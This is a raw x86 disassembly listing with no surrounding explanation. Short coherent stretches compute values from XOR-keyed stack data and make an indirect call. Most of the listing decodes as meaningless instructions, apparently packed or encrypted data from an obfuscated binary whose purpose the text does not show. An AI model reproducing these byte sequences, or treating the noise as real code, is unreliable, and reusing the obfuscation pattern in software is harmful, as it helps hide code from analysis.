  40cb4e:	add    bl,BYTE PTR [eax-0x50]
  40cb51:	add    BYTE PTR [ecx],ah
  40cb53:	mov    dl,BYTE PTR [eax+0x78d269ad]
  40cb59:	pop    edi
  40cb5a:	add    ch,ah
  40cb5c:	push   ds
  40cb5d:	pop    ds
  40cb5e:	iret   
  40cb5f:	iret   
  40cb60:	retf   0xd24a
  40cb63:	mov    edx,DWORD PTR [esi]
  40cb65:	jecxz  0x40cb83
  40cb67:	mov    esi,0xa31e874b
  40cb6c:	push   esi
  40cb6d:	imul   esp,DWORD PTR [eax-0x7],0x4df647e8
  40cb74:	imul   esi,DWORD PTR [ecx],0x5d199f75
  40cb7a:	xchg   di,ax
  40cb7c:	stc    
  40cb7d:	xor    DWORD PTR [edi-0x6c],eax
  40cb80:	rcl    ecx,1
  40cb82:	or     bh,BYTE PTR [eax]
  40cb84:	scas   al,BYTE PTR es:[edi]
  40cb85:	or     DWORD PTR [edi-0x22b175b0],edx
  40cb8b:	test   edx,0xab386f8a
  40cb91:	cmp    BYTE PTR [edx+0xc],al
  40cb94:	nop
  40cb95:	repnz add eax,esi
  40cb98:	imul   eax,DWORD PTR [edx]
  40cb9b:	mov    edx,DWORD PTR [ebp-0x4]
  40cb9e:	xor    edx,ecx
  40cba0:	mov    ecx,DWORD PTR [ebp+0x8]
  40cba3:	lea    ecx,[edx+ecx*1+0x32729b]
  40cbaa:	cmp    ecx,eax
  40cbac:	jne    0x40c41f
  40cbb2:	mov    ebx,esi
  40cbb4:	jmp    0x40cbbe
  40cbb9:	mov    ebx,0x32729b
  40cbbe:	mov    eax,DWORD PTR [ebp-0x4]
  40cbc1:	xor    eax,0x7510854
  40cbc6:	add    eax,ebx
  40cbc8:	mov    DWORD PTR [ebp-0xc],eax
  40cbcb:	xor    ebx,ebx
  40cbcd:	lea    eax,[ebp-0x10]
  40cbd0:	add    ebx,DWORD PTR [eax]
  40cbd2:	call   ebx
  40cbd4:	xor    ebx,ebx
  40cbd6:	inc    ebx
  40cbd7:	cmp    DWORD PTR [ebp+0x10],ebx
  40cbda:	je     0x40d321
  40cbe0:	xchg   edx,eax
  40cbe1:	push   0xa
  40cbe3:	pop    ecx
  40cbe4:	push   0x4
  40cbe6:	pop    ebx
  40cbe7:	inc    ebx
  40cbe8:	xchg   ebx,ecx
  40cbea:	jmp    0x40ce4d
  40cbef:	imul   edx,DWORD PTR [edi-0x4b0ecbf3],0x73
  40cbf6:	push   ecx
  40cbf7:	int3   
  40cbf8:	xor    esp,DWORD PTR [esi+edi*8-0x15]
  40cbfc:	push   edx
  40cbfd:	loop   0x40cc62
  40cbff:	bound  ecx,QWORD PTR [esi+edi*2+0x7e7c387e]
  40cc06:	jle    0x40cc6b
  40cc08:	or     cl,BYTE PTR [edx]
  40cc0a:	mov    dl,BYTE PTR [ebx+0xf7c93b9]
  40cc10:	fadd   DWORD PTR [ebp-0x1f]
  40cc13:	sahf   
  40cc14:	shr    BYTE PTR [edx+0x7a],cl
  40cc17:	fistp  QWORD PTR [ebp+0x435afcc0]
  40cc1d:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40cc1e:	cld    
  40cc1f:	fucomip st,st(4)
  40cc21:	lock shl DWORD PTR [esi],0xe4
  40cc25:	push   ebp
  40cc26:	and    al,0x5a
  40cc28:	fild   QWORD PTR [esi+0x7f]
  40cc2b:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40cc2c:	fstp   DWORD PTR [ebx+0x31]
  40cc2f:	arpl   WORD PTR [ebp-0x30c14dc4],dx
  40cc35:	faddp  st(5),st
  40cc37:	je     0x40cc01
  40cc39:	add    eax,0xb39a4fe6
  40cc3e:	stos   DWORD PTR es:[edi],eax
  40cc3f:	test   ebp,ebx
  40cc41:	xor    BYTE PTR [ebp-0xa],bh
  40cc44:	fstp   QWORD PTR [edi+0x4c71d9a4]
  40cc4a:	test   BYTE PTR [esi+0x18],bl
  40cc4d:	xchg   ebx,eax
  40cc4e:	inc    ecx
  40cc4f:	add    bl,BYTE PTR [ebp-0xc]
  40cc52:	cs scas al,BYTE PTR es:[edi]
  40cc54:	adc    DWORD PTR [edi+0x3b],edx
  40cc57:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40cc58:	sbb    BYTE PTR [esi],ah
  40cc5a:	push   eax
  40cc5b:	mov    bh,0xea
  40cc5d:	mov    ds:0xf38e4de8,al
  40cc62:	data16 ja 0x40cc79
  40cc65:	ss cmp eax,ebx
  40cc68:	jns    0x40cc37
  40cc6a:	test   eax,0x72ebebe7
  40cc6f:	inc    edx
  40cc70:	jl     0x40ccba
  40cc72:	test   esi,ebx
  40cc74:	sub    ch,al
  40cc76:	inc    esi
  40cc77:	enter  0x31fc,0x96
  40cc7b:	mov    ebp,0xbd76b7c3
  40cc80:	jb     0x40cc74
  40cc82:	loope  0x40ccf1
  40cc84:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40cc85:	fwait
  40cc86:	cdq    
  40cc87:	pop    esp
  40cc88:	out    0x85,eax
  40cc8a:	xor    BYTE PTR [edx],bh
  40cc8c:	imul   ecx,DWORD PTR [eax-0xe],0xffffffbb
  40cc90:	sub    bh,BYTE PTR [ebx+eiz*4+0x5d]
  40cc94:	outs   dx,BYTE PTR ds:[esi]
  40cc95:	(bad)  [eax]
  40cc97:	inc    edx
  40cc98:	(bad)  
  40cc99:	cmc    
  40cc9a:	retf   0xd47e
  40cc9d:	data16 outs dx,BYTE PTR ds:[esi]
  40cc9f:	xor    esp,DWORD PTR [ecx-0x135a82c1]
  40cca5:	sub    eax,0x196afdf4
  40ccaa:	repz loope 0x40cd0b
  40ccad:	inc    edx
  40ccae:	mov    ebx,0x5a206610
  40ccb3:	fwait
  40ccb4:	retf   0xa93b
  40ccb7:	push   edi
  40ccb8:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40ccb9:	lods   al,BYTE PTR fs:[esi]
  40ccbb:	mov    bl,BYTE PTR [eax]
  40ccbd:	jmp    0x40ccf9
  40ccbf:	sbb    BYTE PTR [ebx-0x4fbf649],ch
  40ccc5:	xlat   BYTE PTR ds:[ebx]
  40ccc6:	cli    
  40ccc7:	inc    BYTE PTR ds:[edi-0x75]
  40cccb:	cmp    ch,bh
  40cccd:	repnz data16 cli 
  40ccd0:	mov    ecx,0xfbd26053
  40ccd5:	xlat   BYTE PTR ds:[ebx]
  40ccd6:	int3   
  40ccd7:	ret    
  40ccd8:	(bad)  
  40ccd9:	out    0xbe,al
  40ccdb:	cmp    cl,BYTE PTR [ebx+0x32]
  40ccde:	nop
  40ccdf:	cdq    
  40cce0:	mov    edx,DWORD PTR [edx+edx*4]
  40cce3:	sbb    BYTE PTR [ecx+0x41],dh
  40cce6:	mov    ch,BYTE PTR [ebp-0x6]
  40cce9:	nop
  40ccea:	sbb    edx,DWORD PTR [edi+0x6f]
  40cced:	and    DWORD PTR [ebp+0x8],ebp
  40ccf0:	adc    al,0xd1
  40ccf2:	push   eax
  40ccf3:	lds    ebp,FWORD PTR [edx]
  40ccf5:	test   edx,ecx
  40ccf7:	aad    0x9c
  40ccf9:	inc    ebx
  40ccfa:	call   0x9ac4c48e
  40ccff:	mov    eax,0xafb5f6ec
  40cd04:	sbb    esi,DWORD PTR [ecx+0x38]
  40cd07:	iret   
  40cd08:	bound  esp,QWORD PTR [edx+0x3]
  40cd0b:	dec    ebp
  40cd0c:	mov    ah,0xa4
  40cd0e:	push   ds
  40cd0f:	fld    TBYTE PTR [edx]
  40cd11:	fimul  WORD PTR [edi]
  40cd13:	jg     0x40ccc4
  40cd15:	push   esp
  40cd16:	sbb    edi,DWORD PTR [edi+0x14f8ce75]
  40cd1c:	in     al,dx
  40cd1d:	dec    ebx
  40cd1e:	sahf   
  40cd1f:	mov    ebx,0x27a533b7
  40cd24:	int3   
  40cd25:	addr16 shl ecx,cl
  40cd28:	rol    DWORD PTR [edx+ecx*2+0x3fa1187a],cl
  40cd2f:	add    al,0x59
  40cd31:	std    
  40cd32:	xchg   DWORD PTR [eax-0x3a64b3b2],edx
  40cd38:	add    DWORD PTR [edi+eax*1],ebx
  40cd3b:	inc    eax
  40cd3c:	jmp    0x39a9b0ed
  40cd41:	xlat   BYTE PTR ds:[ebx]
  40cd42:	outs   dx,BYTE PTR ds:[esi]
  40cd43:	in     al,0xed
  40cd45:	fs das 
  40cd47:	xchg   DWORD PTR [ebx+0x108fa8b9],ecx
  40cd4d:	dec    edx
  40cd4e:	sbb    DWORD PTR [eax],0x46
  40cd51:	je     0x40cd62
  40cd53:	test   al,0x58
  40cd55:	pop    es
  40cd56:	(bad)  
  40cd57:	cli    
  40cd58:	test   esi,ecx
  40cd5a:	push   ds
  40cd5b:	gs cmp bh,al
  40cd5e:	loope  0x40cd3f
  40cd60:	mov    ebp,0x10c28c3a
  40cd65:	push   ecx
  40cd66:	xchg   edx,eax
  40cd67:	push   esi
  40cd68:	and    BYTE PTR [esi-0x12d2523e],bl
  40cd6e:	(bad)
  40cd71:	loopne 0x40cd44
  40cd73:	mov    ch,0xe9
  40cd75:	pop    edx
  40cd76:	retf   
  40cd77:	cmp    esi,DWORD PTR [bx+di-0x6cd6]
  40cd7c:	int    0xf
  40cd7e:	pop    esp
  40cd7f:	daa    
  40cd80:	shl    BYTE PTR [esi+ebx*2-0xa9b2311],cl
  40cd87:	sub    DWORD PTR [esi-0x31d63eef],ebx
  40cd8d:	or     eax,0x683c2d3e
  40cd92:	nop
  40cd93:	std    
  40cd94:	int3   
  40cd95:	xchg   di,ax
  40cd97:	adc    eax,0x1d3250f9
  40cd9c:	retf   0x37cc
  40cd9f:	mov    al,0x11
  40cda1:	xor    dl,BYTE PTR [ebp-0x185d0a9a]
  40cda7:	in     eax,0xa1
  40cda9:	(bad)  
  40cdaa:	repz lahf 
  40cdac:	lods   al,BYTE PTR ds:[esi]
  40cdad:	loop   0x40cde3
  40cdaf:	or     bh,BYTE PTR [esi+0x42335cf4]
  40cdb5:	out    dx,al
  40cdb6:	outs   dx,BYTE PTR ds:[esi]
  40cdb7:	pusha  
  40cdb8:	xor    BYTE PTR ds:0xd40a00e8,bh
  40cdbe:	call   0x7af39058
  40cdc3:	into   
  40cdc4:	xchg   ebx,eax
  40cdc5:	inc    esp
  40cdc6:	(bad)  
  40cdc7:	mov    cl,0xda
  40cdc9:	lahf   
  40cdca:	jmp    0xfbbd6958
  40cdcf:	push   eax
  40cdd0:	or     ah,al
  40cdd2:	lods   al,BYTE PTR ds:[esi]
  40cdd3:	add    eax,DWORD PTR [eax-0x4ee2b4d6]
  40cdd9:	nop
  40cdda:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40cddb:	adc    esi,edi
  40cddd:	(bad)  
  40cdde:	pop    esi
  40cddf:	cmc    
  40cde0:	pop    es
  40cde1:	xor    DWORD PTR [esi+0x38],0x87dd11d5
  40cde8:	dec    ebp
  40cde9:	cmp    DWORD PTR [edx+eiz*2-0x3c],esi
  40cded:	out    0xf4,al
  40cdef:	inc    ecx
  40cdf0:	cli    
  40cdf1:	or     al,0x29
  40cdf3:	lahf   
  40cdf4:	loope  0x40cdf4
  40cdf6:	rol    BYTE PTR ds:0x1924944d,cl
  40cdfc:	inc    ecx
  40cdfd:	div    BYTE PTR [esi-0x52bde0ff]
  40ce03:	inc    ebp
  40ce04:	dec    edi
  40ce05:	pop    esp
  40ce06:	sahf   
  40ce07:	sbb    bh,BYTE PTR [edx]
  40ce09:	lock sub dh,BYTE PTR [ebx-0x2a]
  40ce0d:	cmc    
  40ce0e:	jbe    0x40ce3a
  40ce10:	push   ss
  40ce11:	test   al,0xa2
  40ce13:	sub    al,0x1d
  40ce15:	jne    0x40cda6
  40ce17:	push   ds
  40ce18:	pop    esi
  40ce19:	add    BYTE PTR [ecx-0x6b],bh
  40ce1c:	repz je 0x40ce0b
  40ce1f:	aam    0xe0
  40ce21:	aad    0x49
  40ce23:	js     0x40ce42
  40ce25:	je     0x40ce82
  40ce27:	jne    0x40ce55
  40ce29:	mov    ch,0x80
  40ce2b:	cld    
  40ce2c:	jecxz  0x40ce6b
  40ce2e:	add    al,0xc
  40ce30:	adc    ch,BYTE PTR [ecx+edi*2]
  40ce33:	ret    
  40ce34:	sub    dl,bl
  40ce36:	push   edx
  40ce37:	div    DWORD PTR [esi+ebx*4-0x54]
  40ce3b:	dec    esi
  40ce3c:	cli    
  40ce3d:	repnz mov DWORD PTR [esi+0x2b],edi
  40ce41:	adc    dh,dh
  40ce43:	rcl    BYTE PTR [ecx+0x4d1d7696],1
  40ce49:	ror    DWORD PTR [edx-0x26d46073],1
  40ce4f:	xchg   ebx,ecx
  40ce51:	jmp    0x40d0b4
  40ce56:	push   ebx
  40ce57:	std    
  40ce58:	dec    ebx
  40ce59:	sahf   
  40ce5a:	push   ecx
  40ce5b:	push   0x84027173
  40ce60:	add    al,0xed
  40ce62:	sub    BYTE PTR [eax-0x74d33252],0x7e
  40ce69:	jle    0x40cea3
  40ce6b:	jl     0x40ceeb
  40ce6d:	jle    0x40ce85
  40ce6f:	add    eax,0x290551e2
  40ce74:	add    dl,cl
  40ce76:	jmp    0x5c8143ba
  40ce7b:	mov    bl,0x6c
  40ce7d:	pop    ss
  40ce7e:	sub    eax,0xcaafe623
  40ce83:	outs   dx,DWORD PTR ds:[esi]
  40ce84:	aad    0x39
  40ce86:	mov    esi,0x27c7856a
  40ce8b:	mov    cl,0xac
  40ce8d:	dec    eax
  40ce8e:	lods   eax,DWORD PTR ds:[esi]
  40ce8f:	mov    dh,0xa6
  40ce91:	fiadd  WORD PTR [ebx]
  40ce93:	jg     0x40ce71
  40ce95:	xor    eax,0x3a621cea
  40ce9a:	mov    eax,gs:0x7ea732a1
  40cea0:	pop    ebx
  40cea1:	aad    0x7a
  40cea3:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40cea4:	ret    0x9ae3
  40cea7:	addr16 sub eax,0x496391ab
  40cead:	(bad)  [ecx+0x7371f74d]
  40ceb3:	aam    0x91
  40ceb5:	out    0x47,eax
  40ceb7:	xchg   esp,eax
  40ceb8:	jmp    0xdbf3:0xd6daf741
  40cebf:	or     bh,ch
  40cec1:	xor    BYTE PTR [ecx+0x1d],al
  40cec4:	fsub   st,st(7)
  40cec6:	inc    ecx
  40cec7:	adc    ah,ah
  40cec9:	pop    ecx
  40ceca:	scas   eax,DWORD PTR es:[edi]
  40cecb:	push   ebp
  40cecc:	xlat   BYTE PTR ds:[ebx]
  40cecd:	sbb    al,0xb
  40cecf:	(bad)  
  40ced1:	mov    DWORD PTR [ebx],ebx
  40ced3:	inc    dh
  40ced5:	xchg   edi,eax
  40ced6:	imul   edi,DWORD PTR [ecx+0x7f],0x3597b9a5
  40cedd:	popa   
  40cede:	adc    eax,0xb120303
  40cee3:	mov    cl,0xd6
  40cee5:	aad    0xc
  40cee7:	in     eax,dx
  40cee8:	push   esp
  40cee9:	nop
  40ceea:	(bad)  
  40ceec:	retf   0x778
  40ceef:	pop    esi
  40cef0:	popf   
  40cef1:	dec    edx
  40cef2:	lods   eax,DWORD PTR ds:[esi]
  40cef3:	adc    al,0x74
  40cef5:	pop    es
  40cef6:	mov    bl,0x2f
  40cef8:	cwde   
  40cef9:	mov    edi,0x8cc98e9e
  40cefe:	popf   
  40ceff:	call   0x8ae10c33
  40cf04:	push   0x62eb44f8
  40cf09:	enter  0x4f39,0xce
  40cf0d:	call   0x17b80c17
  40cf12:	pop    edi
  40cf13:	xchg   ecx,eax
  40cf14:	in     al,0x52
  40cf16:	stos   BYTE PTR es:[edi],al
  40cf17:	je     0xbd3c1550
  40cf1d:	xor    bh,bh
  40cf1f:	(bad)  
  40cf20:	into   
  40cf21:	mov    esi,0xe5d4689d
  40cf26:	(bad)  
  40cf27:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40cf28:	rcl    BYTE PTR [edx-0x2ba2bf5c],1
  40cf2e:	inc    ebx
  40cf2f:	pop    eax
  40cf30:	push   esp
  40cf31:	out    0xd2,al
  40cf33:	mov    ecx,0xb04f2dd3
  40cf38:	and    al,0x87
  40cf3a:	sub    DWORD PTR [eax+0x3526fede],ebx
  40cf40:	icebp  
  40cf41:	popf   
  40cf42:	xchg   BYTE PTR [eax-0xf],dl
  40cf45:	mov    DWORD PTR [ebp-0x7ce6bebf],ebp
  40cf4b:	add    DWORD PTR [edi-0x6e],ebp
  40cf4e:	mov    bl,BYTE PTR [eax]
  40cf50:	adc    eax,0x1085b085
  40cf55:	xchg   edx,eax
  40cf56:	mov    ch,0xa3
  40cf58:	push   es
  40cf59:	or     ch,0xfc
  40cf5c:	and    ecx,DWORD PTR [eax]
  40cf5e:	sahf   
  40cf5f:	call   0xad8b9396
  40cf64:	adc    eax,0x8f833ea5
  40cf69:	loope  0x40cf8a
  40cf6b:	std    
  40cf6c:	call   0xffa23382
  40cf71:	jg     0x40cf63
  40cf73:	gs xchg ecx,eax
  40cf75:	jge    0x40cf5b
  40cf77:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40cf78:	add    eax,0x6f5ecdcf
  40cf7d:	outs   dx,BYTE PTR ds:[esi]
  40cf7e:	imul   BYTE PTR [edi+0x6d]
  40cf81:	iret   
  40cf82:	call   0xe616333d
  40cf87:	xor    dl,BYTE PTR [edx]
  40cf89:	not    DWORD PTR [edi*8-0x6e98cc1b]
  40cf90:	pusha  
  40cf91:	cmp    al,0xee
  40cf93:	sub    al,0xd0
  40cf95:	clc    
  40cf96:	add    bh,ch
  40cf98:	sahf   
  40cf99:	fnstsw WORD PTR [edi+eax*2+0x230afb16]
  40cfa0:	aaa    
  40cfa1:	adc    al,0xa9
  40cfa3:	sbb    BYTE PTR [esi-0x43],0xd0
  40cfa7:	popa   
  40cfa8:	mov    al,0x54
  40cfaa:	inc    eax
  40cfab:	in     eax,0xce
  40cfad:	stos   BYTE PTR es:[edi],al
  40cfae:	xlat   BYTE PTR ds:[ebx]
  40cfaf:	retf   
  40cfb0:	lds    ebx,FWORD PTR [ecx]
  40cfb2:	sar    BYTE PTR [ebp+0x30],cl
  40cfb5:	xor    eax,0xa892d499
  40cfba:	adc    eax,0x3a0b148
  40cfbf:	enter  0x9e2d,0x27
  40cfc3:	imul   BYTE PTR [edx-0x3e]
  40cfc6:	fidiv  WORD PTR [ecx-0x2d7a4773]
  40cfcc:	pmaxsw mm4,QWORD PTR [esi+0x51]
  40cfd0:	sbb    al,0xec
  40cfd2:	mov    edx,0x5ae1c02e
  40cfd7:	sbb    BYTE PTR [edx-0x89be24f],ch
  40cfdd:	mov    DWORD PTR ss:[esi],esi
  40cfe0:	ret    0x6a2d
  40cfe3:	mov    ebx,0xcb7fd9c4
  40cfe8:	or     al,0x12
  40cfea:	mov    esp,DWORD PTR [eax]
  40cfec:	cs mov esp,0x922157a3
  40cff2:	mov    edx,DWORD PTR [ebp-0xb]
  40cff5:	add    BYTE PTR [eax],cl
  40cff7:	test   BYTE PTR [edx-0x1011d1a2],al
  40cffd:	aam    0x81
  40cfff:	jg     0x40cfa4
  40d001:	mov    bl,0xde
  40d003:	adc    al,BYTE PTR [esi+0x4a]
  40d006:	ret    0x5f61
  40d009:	lods   al,BYTE PTR ds:[esi]
  40d00a:	out    0xab,al
  40d00c:	out    0x1,al
  40d00e:	pop    ds
  40d00f:	sbb    DWORD PTR [edi-0x53c21750],0x32829d2
  40d019:	or     bl,BYTE PTR [eax]
  40d01b:	adc    BYTE PTR [esi],dh
  40d01d:	pop    edx
  40d01e:	into   
  40d01f:	push   esp
  40d020:	pop    es
  40d021:	dec    edx
  40d022:	loop   0x40d030
  40d024:	jl     0x40d07a
  40d026:	lea    esp,[eax]
  40d028:	ds scas eax,DWORD PTR es:[edi]
  40d02a:	push   cs
  40d02b:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40d02c:	adc    DWORD PTR [edi-0x5128abb3],edi
  40d032:	inc    edi
  40d033:	fisubr DWORD PTR [edi-0xa1c90fa]
  40d039:	das    
  40d03a:	pop    ss
  40d03b:	xchg   DWORD PTR [ecx+0x3a9f49b7],ebx
  40d041:	push   edi
  40d042:	mov    edx,0xbd1f366d
  40d047:	xor    eax,0x4415151
  40d04c:	call   0xaa72:0xde0071fe
  40d053:	xor    BYTE PTR [esi],dh
  40d055:	test   BYTE PTR [edx-0x26],ah
  40d058:	and    bh,BYTE PTR [esi+0x1f]
  40d05b:	or     ebx,DWORD PTR [esi]
  40d05d:	imul   DWORD PTR [ecx]
  40d05f:	out    0x78,al
  40d061:	ret    0x3ca6
  40d064:	mov    ch,0xcc
  40d066:	mov    BYTE PTR [edi*4+0x31b426c6],cl
  40d06d:	jne    0x40d039
  40d06f:	jno    0x40d05a
  40d071:	adc    DWORD PTR [eax+0x665cf739],ebx
  40d077:	jbe    0x40d02a
  40d079:	mov    ?,WORD PTR fs:[eax+0x2f]
  40d07d:	out    dx,al
  40d07e:	(bad)  
  40d07f:	test   DWORD PTR [eax+0x56],esi
  40d082:	xchg   BYTE PTR [esi],dh
  40d084:	xchg   BYTE PTR [ebx],dh
  40d086:	xor    BYTE PTR [ebx+0x6e8c3ac5],bh
  40d08c:	dec    edx
  40d08d:	mov    BYTE PTR [ecx-0x6723752f],cl
  40d093:	jne    0x40d073
  40d095:	xchg   BYTE PTR [edi],al
  40d097:	push   edx
  40d098:	mov    cl,dl
  40d09a:	mov    ah,0x12
  40d09c:	in     al,dx
  40d09d:	in     al,dx
  40d09e:	(bad)  
  40d09f:	pop    esi
  40d0a0:	push   ss
  40d0a1:	addr16 test eax,0x31d3a473
  40d0a7:	xchg   BYTE PTR [edi+0xda36af],bh
  40d0ad:	add    BYTE PTR [ebp-0x40],cl
  40d0b0:	fcmovnu st,st(4)
  40d0b2:	adc    bh,BYTE PTR [esi-0x1bba74b7]
  40d0b8:	imul   eax,ecx
  40d0bb:	add    esp,eax
  40d0bd:	xchg   edx,eax
  40d0be:	jmp    0x40d321
  40d0c3:	sahf   
  40d0c4:	test   BYTE PTR [edi],0xc3
  40d0c7:	push   edi
  40d0c8:	repz pop edx
  40d0ca:	jae    0x40d0bf
  40d0cc:	ficom  WORD PTR [edx+0x6a]
  40d0cf:	mov    esp,0xf6194506
  40d0d4:	mov    DWORD PTR [esi+0x7e],edi
  40d0d7:	cmp    BYTE PTR [esi+edi*2+0x7e],bh
  40d0db:	sar    ebx,0x2
  40d0de:	in     al,0x26
  40d0e0:	cmp    bl,bh
  40d0e2:	or     al,0xef
  40d0e4:	fwait
  40d0e5:	out    0x64,eax
  40d0e7:	mul    dh
  40d0e9:	test   esp,edx
  40d0eb:	push   edx
  40d0ec:	enter  0x658c,0xb0
  40d0f0:	test   eax,ebp
  40d0f2:	ds xchg esi,eax
  40d0f4:	jge    0x40d13d
  40d0f6:	pusha  
  40d0f7:	aam    0xfc
  40d0f9:	pop    eax
  40d0fa:	fiadd  WORD PTR [esi+ebx*1]
  40d0fd:	loope  0x40d097
  40d0ff:	lock xchg edi,eax
  40d101:	dec    ebx
  40d102:	inc    ecx
  40d103:	inc    edi
  40d104:	mov    bh,0x20
  40d106:	jns    0x40d0c5
  40d108:	jmp    0x40d179
  40d10a:	fistp  QWORD PTR [eax]
  40d10c:	vaddpd xmm4,xmm3,XMMWORD PTR ds:0xc5a1c230
  40d114:	sub    ecx,DWORD PTR [ecx]
  40d116:	fmul   DWORD PTR [ecx]
  40d118:	mov    edx,0xb4c57a23
  40d11d:	loopne 0x40d0b0
  40d11f:	lahf   
  40d120:	or     al,BYTE PTR [esi]
  40d122:	(bad)  
  40d123:	pop    ebp
  40d124:	int3   
  40d125:	xchg   ecx,ebp
  40d127:	or     eax,0xad4496f
  40d12c:	cmp    BYTE PTR [esi+0x7381c66],al
  40d132:	stc    
  40d133:	sbb    al,0x49
  40d135:	fld    st(1)
  40d137:	stos   BYTE PTR es:[edi],al
  40d138:	cmc    
  40d139:	dec    ecx
  40d13a:	aaa    
  40d13b:	and    BYTE PTR [ecx+eiz*8-0x5a],dl
  40d13f:	jmp    0x5495:0x4145055c
  40d146:	call   0xf406f0bb
  40d14b:	int3   
  40d14c:	gs push ebx
  40d14e:	int3   
  40d14f:	mov    al,0xd4
  40d151:	mov    eax,0xcfd70747
  40d156:	idiv   BYTE PTR [ebx+0x1d]
  40d159:	jge    0x40d1d2
  40d15b:	adc    ch,0xa1
  40d15e:	popf   
  40d15f:	cdq    
  40d160:	idiv   BYTE PTR [ebx+eiz*4+0x19]
  40d164:	cs idiv edi
  40d167:	sub    BYTE PTR [ecx+0x796899a5],bh
  40d16d:	and    al,0xd5
  40d16f:	out    0x61,eax
  40d171:	sahf   
  40d172:	push   ss
  40d173:	mov    cl,0x93
  40d175:	jl     0x40d1a0
  40d177:	retf   
  40d178:	pop    edi
  40d179:	mov    ch,0xae
  40d17b:	rol    dh,0x1
  40d17e:	push   es
  40d17f:	mov    eax,0xefd0d42e
  40d184:	or     bh,BYTE PTR [esi]
  40d186:	jg     0x40d17e
  40d188:	fld    DWORD PTR [ecx-0x2]
  40d18b:	inc    edx
  40d18c:	loope  0x40d1d2
  40d18e:	aad    0xba
  40d190:	mov    dh,0xd0
  40d192:	push   eax
  40d193:	fwait
  40d194:	cmc    
  40d195:	xchg   BYTE PTR [edx],dh
  40d197:	and    ch,BYTE PTR [edi-0x4b]
  40d19a:	cmp    DWORD PTR [edi-0x1e],esp
  40d19d:	jge    0x40d1d6
  40d19f:	into   
  40d1a0:	inc    eax
  40d1a1:	test   DWORD PTR [ebx],esi
  40d1a3:	adc    al,ch
  40d1a5:	inc    ecx
  40d1a6:	dec    ebp
  40d1a7:	and    BYTE PTR [edi],bl
  40d1a9:	stos   BYTE PTR es:[edi],al
  40d1aa:	popf   
  40d1ab:	cmp    DWORD PTR [eax-0x64],ebp
  40d1ae:	data16 data16 cmp bl,BYTE PTR [ebp-0x7c]
  40d1b3:	inc    esp
  40d1b4:	cli    
  40d1b5:	fimul  WORD PTR [edi+esi*1-0x3c]
  40d1b9:	push   edi
  40d1ba:	lea    eax,[ebp+0x17]
  40d1bd:	out    dx,eax
  40d1be:	mov    ch,0xe8
  40d1c0:	sbb    dh,dh
  40d1c2:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40d1c3:	xchg   bl,bh
  40d1c5:	repz mov WORD PTR [ebx],?
  40d1c8:	repnz mov eax,ds
  40d1cb:	mov    al,0x17
  40d1cd:	jge    0x40d1b8
  40d1cf:	nop
  40d1d0:	add    al,0x1a
  40d1d2:	mov    ?,ebp
  40d1d4:	mov    ds:0xa8408ea,al
  40d1d9:	xchg   esp,edx
  40d1db:	jl     0x40d1b0
  40d1dd:	(bad)  
  40d1de:	push   edi
  40d1df:	mov    bh,0x27
  40d1e1:	js     0x40d188
  40d1e3:	cwde   
  40d1e4:	fs cmp dh,ch
  40d1e7:	test   DWORD PTR [esi],0x3352811b
  40d1ed:	mov    ch,0xbc
  40d1ef:	call   0x49a5ce8b
  40d1f4:	cs xor esi,esi
  40d1f7:	cs xor al,0x89
  40d1fa:	popa   
  40d1fb:	mov    ebx,0xb614101e
  40d200:	popa   
  40d201:	cmp    BYTE PTR ds:0x61f79720,bh
  40d207:	lock sub al,0xb6
  40d20a:	mov    ds:0x5d75fdf9,al
  40d20f:	call   0x18e098c5
  40d214:	push   esi
  40d215:	ret    0xb2c5
  40d218:	xchg   DWORD PTR [edx+0x74],ebx
  40d21b:	mov    ?,WORD PTR [edx+ebp*8+0x2b7781d6]
  40d222:	(bad)  
  40d224:	cmp    ecx,ebp
  40d226:	sbb    ebp,eax
  40d228:	xor    BYTE PTR [esi-0x7f1633e7],dl
  40d22e:	cmp    DWORD PTR [ebx+0x6f2bab3c],0x5d
  40d235:	jae    0x40d291
  40d237:	xor    DWORD PTR [ecx+ebx*4],ecx
  40d23a:	adc    cl,dh
  40d23c:	movs   DWORD PTR es:[edi],DWORD PTR fs:[esi]
  40d23e:	test   DWORD PTR [esi],ebp
  40d240:	pop    ebp
  40d241:	iret   
  40d242:	sahf   
  40d243:	test   DWORD PTR [esi+0x4764dda5],ebx
  40d249:	sub    edx,DWORD PTR [edx+ebp*8+0x55d4315a]
  40d250:	mov    BYTE PTR [esi],ch
  40d252:	out    0xe8,al
  40d254:	adc    BYTE PTR [edi+0x15],cl
  40d257:	arpl   WORD PTR [ebx-0x582ec6a],bx
  40d25d:	adc    esi,DWORD PTR [edi]
  40d25f:	shl    al,cl
  40d261:	pop    ds
  40d262:	das    
  40d263:	std    
  40d264:	xor    ebp,ecx
  40d266:	lods   eax,DWORD PTR ds:[esi]
  40d267:	jbe    0x40d1f5
  40d269:	lock mov al,ds:0x492defc8
  40d26f:	or     DWORD PTR [ecx-0x43],ebx
  40d272:	bnd jmp 0x973d2339
  40d278:	sbb    cl,dh
  40d27a:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40d27b:	add    ch,dh
  40d27d:	and    bl,BYTE PTR [ebx+esi*1]
  40d280:	cmp    eax,0x369395c7
  40d285:	dec    eax
  40d286:	sbb    BYTE PTR [edi+0x5a],ch
  40d289:	sub    al,0x59
  40d28b:	lds    esi,FWORD PTR [esi-0x1e59c0d8]
  40d291:	cmp    eax,0xb18f314b
  40d296:	inc    edx
  40d297:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40d298:	out    0xe5,al
  40d29a:	sub    cl,BYTE PTR [ebx]
  40d29c:	fstp   TBYTE PTR [eax-0x59c49be3]
  40d2a2:	xchg   ebx,eax
  40d2a3:	lds    edi,FWORD PTR [edx+0x52784595]
  40d2a9:	es pop esp
  40d2ab:	into   
  40d2ac:	dec    ecx
  40d2ad:	jg     0x40d31a
  40d2af:	mov    ds:0x670a3b43,eax
